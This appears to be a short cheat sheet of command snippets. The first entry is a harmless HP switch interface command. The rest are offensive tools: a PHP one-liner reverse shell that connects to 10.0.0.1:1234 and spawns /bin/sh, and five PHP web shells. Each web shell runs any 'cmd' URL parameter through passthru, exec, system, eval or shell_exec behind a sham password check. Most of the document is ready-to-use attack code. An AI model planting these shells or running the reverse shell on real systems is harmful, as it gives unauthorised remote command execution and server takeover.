### 1. hp switch show if info
```
display interface brief
```
**- networking,hp**
#### References:

http://www.h3c.com.hk/technical_support___documents/technical_documents/wlan/access_point/h3c_wa2200_series_wlan_access_points/command/command/h3c_wa_wlan_access_cr-6w100/03/201009/691873_1285_0.htm
__________
### 2. php reverse shell : php from the CLI
```
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```
**- linux,reverse shells,Windows,php**
#### References:

https://highon.coffee/blog/reverse-shell-cheat-sheet/
__________
### 3. Php Simple shell, set aPasswordto access, cmd is your command: See Commix to use this easily
```
<?php if (isset($_GET['Password'])){passthru($_GET['cmd']);} ?>
```
**- web application,php,remote command shell**
#### References:

php.net/manual/en/function.passthru.php
__________
### 4. Php Simple shell, set Password to access, cmd is your command: See Commix to use this easily
```
<?php if (isset($_GET['Password'])){exec($_GET['cmd']);} ?>
```
**- web application,php,remote command shell**
#### References:

php.net/manual/en/function.exec.php
__________
### 5. Php Simple shell, set Password to access, cmd is your command: See Commix to use this easily
```
<?php if (isset($_GET['Password'])){system($_GET['cmd']);} ?>
```
**- web application,php,remote command shell**
#### References:

php.net/manual/en/function.system.php
__________
### 6. Php Simple shell, set Password to access, cmd is your command: See Commix to use this easily
```
<?php if (isset($_GET['Password'])){eval($_GET['cmd']);} ?>
```
**- web application,php,remote command shell**
#### References:

php.net/manual/en/function.eval.php
__________
### 7. Php Simple shell, set Password to access, bis your command: See Commix to use this easily
```
<?php if (isset($_GET['Password'])){shell_exec($_GET['cmd']);} ?>
```
**- web application,php,remote command shell**
#### References:

php.net/manual/en/function.shell-exec.php
__________
